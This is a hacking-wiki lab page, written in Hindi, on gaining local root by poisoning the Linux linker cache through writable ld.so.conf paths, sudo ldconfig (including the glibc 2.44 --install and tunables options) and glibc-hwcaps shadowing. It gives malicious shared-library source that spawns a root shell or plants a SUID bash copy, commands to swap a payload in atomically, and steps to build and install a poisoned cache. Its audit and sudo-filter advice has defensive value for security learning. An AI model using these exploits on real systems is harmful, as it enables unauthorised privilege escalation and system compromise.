# ld.so privesc exploit का उदाहरण

{{#include ../../banners/hacktricks-training.md}}

यह पेज **`/etc/ld.so.conf` या `ldconfig` के माध्यम से system linker cache को poison करने** के लिए एक focused lab है। Missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` और अन्य generic SUID linker abuse के लिए [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) देखें।

## Environment तैयार करें

निम्नलिखित section में उन files का code दिया गया है, जिनका उपयोग हम environment तैयार करने के लिए करेंगे।

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. अपनी machine में उसी folder में उन files को **Create** करें
2. **library** को **Compile** करें: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` को `/usr/lib` में **Copy** करें और cache को refresh करें: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **executable** को **Compile** करें: `gcc sharedvuln.c -o sharedvuln -lcustom`

### environment को जांचें

जांचें कि _libcustom.so_ को _/usr/lib_ से **load** किया जा रहा है और आप binary को **execute** कर सकते हैं।
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### उपयोगी triage commands

किसी वास्तविक target पर हमला करते समय, **exact library name** को verify करें जिसकी binary को आवश्यकता है, यह जांचें कि loader **currently resolving** क्या कर रहा है, और live cache को mutate किए बिना यह पता लगाएं कि configured paths में से कौन-से writable हैं।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` का उपयोग केवल **trusted** executable पर करें। कुछ implementations या असामान्य ELF interpreters के कारण यह attacker-controlled code execute कर सकता है; `objdump -p ./file | grep NEEDED` direct dependencies को सुरक्षित रूप से सूचीबद्ध करता है। किसी trusted target के लिए, खोजे गए interpreter को `--list` के साथ invoke करने पर वास्तविक resolution दिखाई देता है। उस output की तुलना `--inhibit-cache --list` के साथ करें: अंतर यह सिद्ध करता है कि object को किसी सामान्य search-path rule के बजाय `/etc/ld.so.cache` ने चुना।<sup>[[1]](#references)[[4]](#references)</sup>

कुछ उपयोगी सावधानियाँ:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` आमतौर पर **काम नहीं करता**, क्योंकि
redirection आपके current shell द्वारा की जाती है। इसके बजाय
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` का उपयोग करें।
- **SUID/privileged** binaries **secure-execution mode** में चलती हैं: `LD_LIBRARY_PATH`
को ignore किया जाता है, जबकि `LD_PRELOAD` restricted होता है (slash वाले names
ignore किए जाते हैं, और केवल standard directories में मौजूद setuid-marked libraries को
preload किया जा सकता है)। जब root `ldconfig` चलाता है, तो
`/etc/ld.so.conf` में सूचीबद्ध directories `/etc/ld.so.cache` में शामिल हो सकती हैं,
इसलिए यह misconfiguration अभी भी privileged programs को प्रभावित कर सकती है।<sup>[[1]](#references)[[2]](#references)</sup>
- secure-execution mode में `LD_DEBUG` भी ignore किया जाता है, जब तक कि `/etc/suid-debug` मौजूद न हो। इसलिए privileged execution से output की अपेक्षा करने के बजाय, किसी equivalent non-SUID run से उसका trace collect करें।<sup>[[1]](#references)</sup>
- glibc 2.33 और उसके बाद के versions में, dynamic loader
`--list-diagnostics` भी provide करता है, जो hijack के अपेक्षित रूप से काम न करने पर
machine-readable loader diagnostics और built-in search-path information print करता है।<sup>[[1]](#references)[[6]](#references)</sup>

### Cache और SONAME constraints

`ldconfig` configured directory में मौजूद हर arbitrary file को cache नहीं करता: यह ELF headers की जाँच करता है, `lib*.so*` या `ld-*.so*` से match होने वाले names को पहचानता है, और conventional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain की अपेक्षा करता है। इसलिए injected object में target architecture/class, exact `DT_NEEDED` name (आमतौर पर उसका `DT_SONAME`), और victim द्वारा resolve किए जाने वाले सभी symbols/versions होने चाहिए।<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer इस उदाहरण जैसी target-specific library का उपयोग करें। किसी common SONAME को incomplete object से shadow करने पर, intended privileged target के चलने से पहले उसे resolve करने वाली हर process टूट सकती है।<sup>[[3]](#references)</sup>

### Cached-path persistence और atomic swaps

Cache में **library name से pathname** का mapping दर्ज होता है; इसमें shared object शामिल नहीं होता। किसी attacker-controlled pathname के cache में दर्ज हो जाने के बाद, उसी exact path पर object को replace करने से किसी अन्य `ldconfig` run के बिना newly started processes प्रभावित होती हैं। इससे उपयोगी time-of-check/time-of-use pattern संभव होता है: administrator के cache rebuild या inspection के दौरान valid library उपलब्ध कराएँ, फिर payload को atomic रूप से उसके ऊपर rename कर दें। Existing processes अपने पहले से mapped object को बनाए रखती हैं।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
इसी प्रकार, `ld.so.conf` से malicious line को delete करने पर भी पहले से लिखी गई entry अपने-आप evict नहीं होती: administrator को untrusted object हटाना होगा, ownership/write access ठीक करना होगा और cache को rebuild करना होगा। stale cache entry और अभी भी active configuration path के बीच अंतर करने के लिए ऊपर दी गई `--inhibit-cache` comparison का उपयोग करें।<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

इस scenario में मान लें कि administrator ने `/etc/ld.so.conf.d/` के अंतर्गत किसी file में एक vulnerable entry जोड़ी है, जिसे system की `/etc/ld.so.conf` include करती है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Vulnerable folder _/home/ubuntu/lib_ है (जहाँ हमारे पास writable access है)।\
इस path के अंदर निम्नलिखित code को **Download और compile** करें:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
यदि आप अपेक्षा करते हैं कि **root** (या कोई अन्य privileged account) बाद में vulnerable binary को execute करेगा, तो आमतौर पर interactive shell spawn करने के बजाय **root-owned artifact** छोड़ना बेहतर होता है। उदाहरण के लिए:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
फिर, privileged execution होने के बाद, आप `/tmp/rootbash -p` का उपयोग कर सकते हैं।

अब जबकि हमने **misconfigured** path के अंदर malicious libcustom library **बना ली है**, default cache को सफल privileged **`ldconfig`** run द्वारा फिर से बनाया जाना आवश्यक है। Reboot केवल तभी मदद करता है जब local boot process वास्तव में इसे invoke करता हो; अन्यथा administrator की कार्रवाई का इंतज़ार करें या यदि उपलब्ध हो, तो unsafe sudo rule का उपयोग करें।<sup>[[2]](#references)</sup>

ऐसा हो जाने के बाद, **पुनः जाँचें** कि `sharedvuln` executable `libcustom.so` library को कहाँ से load कर रहा है:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह इसे **`/home/ubuntu/lib` से load कर रहा है** और यदि कोई user इसे execute करता है, तो एक shell execute होगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> ध्यान दें कि इस उदाहरण में हमने privileges escalate नहीं किए हैं, लेकिन executed commands को modify करके और **root या किसी अन्य privileged user द्वारा vulnerable binary execute करने की प्रतीक्षा करके** हम privileges escalate कर पाएँगे।

### आधुनिक `glibc-hwcaps` shadowing

glibc 2.33 के बाद से, loader **हर library search directory** के अंदर `glibc-hwcaps/<level>/` के नीचे मौजूद optimized libraries को प्राथमिकता दे सकता है। इसलिए केवल `/home/ubuntu/lib` की जाँच करना पर्याप्त नहीं है: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` जैसी writable compatible subdirectory, `ldconfig` द्वारा index किए जाने के बाद base library को shadow कर सकती है, जबकि अन्य CPUs base object का उपयोग करते रहते हैं। इससे architecture-selective hijack भी संभव होता है, जो किसी अलग CPU पर validation किए जाने पर छूट सकता है।<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
वर्तमान glibc hardening guidance duplicate SONAMEs, non-default search locations और `glibc-hwcaps` subdirectories में मौजूद objects से बचने की सलाह देती है। Audit के दृष्टिकोण से, configured directories और उनके parent path components पर ownership और writeability checks को recursively लागू करें।<sup>[[3]](#references)</sup>

### अन्य misconfigurations - वही vuln

पिछले उदाहरण में हमने एक misconfiguration को fake किया था, जिसमें administrator ने **`/etc/ld.so.conf.d/` के अंदर मौजूद configuration file में एक non-privileged folder सेट किया था**।\
लेकिन ऐसी अन्य misconfigurations भी हैं जो वही vulnerability पैदा कर सकती हैं: यदि आपके पास किसी loaded **config file** में **write permissions** हैं, आप किसी writable `/etc/ld.so.conf.d/` directory में file बना सकते हैं, या `/etc/ld.so.conf` में write कर सकते हैं, तो आप उसी vulnerability को configure और exploit कर सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**मान लें कि आपके पास `ldconfig` पर sudo privileges हैं**। `ldconfig` scan directories को positional arguments के रूप में स्वीकार करता है, इसलिए cache-poisoning का सबसे छोटा तरीका अक्सर केवल यह होता है:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
वैकल्पिक रूप से, `-f` डिफ़ॉल्ट cache output को बनाए रखते हुए किसी अन्य configuration file का चयन करता है। यह तब उपयोगी है जब कोई argument filter positional directories को block करता है, लेकिन `-f` की अनुमति देता है, या जब कई paths inject करने हों:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **पिछली exploit** में बताया गया है, **malicious library को `/tmp` के अंदर बनाएं**।\
और अंत में, path को load करें और जांचें कि binary library को कहां से load कर रहा है:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo privileges होने पर आप उसी vulnerability का exploit कर सकते हैं।** सीमित sudo rule का आकलन करते समय options की details महत्वपूर्ण होती हैं: `-f` किसी अन्य configuration को चुनता है, लेकिन फिर भी `/etc/ld.so.cache` को rebuild करता है; `-C` cache को कहीं और redirect करता है; `-N` cache rebuilding को रोकता है; और `-X` link updates को रोकता है, लेकिन **`-N` के साथ उपयोग किए जाने तक cache को फिर भी rebuild करता है**। `-n`, `-N` को imply करता है, इसलिए यह दिए गए directories में links को update कर सकता है, लेकिन cache को poison नहीं कर सकता; `-r` किसी alternate root के नीचे operate करता है और सामान्यतः host cache को नहीं बदलता।<sup>[[2]](#references)</sup>

### glibc 2.44: prebuilt cache install करना

Glibc 2.44 में `ldconfig --install SOURCE` जोड़ा गया, जो एक prebuilt cache को चुने गए cache destination पर atomically copy करता है (host `/etc/ld.so.cache`, जब तक `-C` या `-r` इसे न बदलें)। इससे sudoers rules और privileged wrappers के लिए एक और dangerous argument बनता है: attacker **बिना privileges के** एक valid cache construct कर सकता है, फिर permitted `--install` invocation का उपयोग करके system cache को replace कर सकता है। Install path cache magic को check करता है, लेकिन trusted configuration से इसकी entries को regenerate नहीं करता।<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
कैश में अब भी **pathnames** मौजूद हैं, library bytes नहीं, इसलिए victim के शुरू होने पर `/tmp/libcustom.so` का मौजूद और compatible रहना आवश्यक है। ऐसे filters जो केवल `-f`, positional directories या `-t` को अस्वीकार करते हैं, glibc 2.44 पर अधूरे हैं: `--install`/`-I` को भी अस्वीकार करें या बेहतर होगा कि `ldconfig` को बिल्कुल delegate न करें।<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: cached system-wide tunables

glibc 2.44 से शुरू होकर, `ldconfig` अब `/etc/tunables.conf` को भी parse करता है और इसकी settings को `/etc/ld.so.cache` में extension के रूप में store करता है। यह file `include` directives और per-process filters स्वीकार करती है। Prefixes scope नियंत्रित करते हैं: `@`/`onlysecure` केवल `AT_SECURE` processes को target करता है, `$`/`nonsecure` उन्हें exclude करता है, और `*`/`anysecure` दोनों को cover करता है। **बिना prefix वाली entry डिफ़ॉल्ट रूप से non-secure processes पर लागू होती है**, इसलिए किसी attacker को setuid, setgid या capability-elevated programs को प्रभावित करने के लिए स्पष्ट रूप से `@` या `*` का उपयोग करना होगा। इससे audit boundary library directories से आगे बढ़ जाती है: writable tunables configuration या included file, privileged cache rebuild के बाद future program startups को प्रभावित कर सकती है।<sup>[[7]](#references)[[9]](#references)</sup>

इसी release में `ldconfig -t TUNCONF` जोड़ा गया है, जो एक alternate tunables file चुनता है और फिर भी normal cache में write करता है, जब तक कि कोई अन्य option इसे बदल न दे। इसलिए, केवल `-f` को block करने वाले wrappers और sudo rules को `-t`, arbitrary positional directories, `--install` और cache-output manipulation को भी reject करना होगा।<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### लक्ष्य-चयनात्मक tunables

`[proc:PATTERN]` फ़िल्टर निम्नलिखित entries को केवल तभी लागू करता है, जब executable का पूरा `/proc/self/exe` path (यदि `PATTERN` `/` से शुरू होता है) या basename मेल खाता हो। फ़िल्टर अगले फ़िल्टर, `[]`, फ़ाइल के अंत या include-file boundary पर समाप्त होता है। इससे poisoned cache कम noisy रहता है, क्योंकि बदले हुए behavior को एक privileged victim तक सीमित किया जा सकता है।<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
`-`/`nonoverridable` prefix `GLIBC_TUNABLES` को cached value को override करने से रोकता है; `+`/`overridable` सामान्य override behavior को पुनर्स्थापित करता है। `AT_SECURE` processes के लिए environment variable को वैसे भी पूरी तरह अनदेखा किया जाता है। File format को version-specific मानें—glibc इसे stable interface के रूप में उपलब्ध कराने का वादा नहीं करता—और किसी targeted effect का प्रयास करने से पहले `"$interp" --list-tunables` के साथ supported names और values की सूची बनाएँ।<sup>[[7]](#references)[[9]](#references)</sup>

यह अपने आप arbitrary code execution नहीं है। यह एक privileged **loader-behavior manipulation** primitive है: glibc स्पष्ट रूप से चेतावनी देता है कि system-wide values, per-tunable security screening के बिना setuid/setgid programs पर security-sensitive tunables लागू कर सकती हैं। Universal payload मानने के बजाय target-specific allocator changes, CPU-hardening changes या denial-of-service conditions खोजें।<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library version 2.44 is now available](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
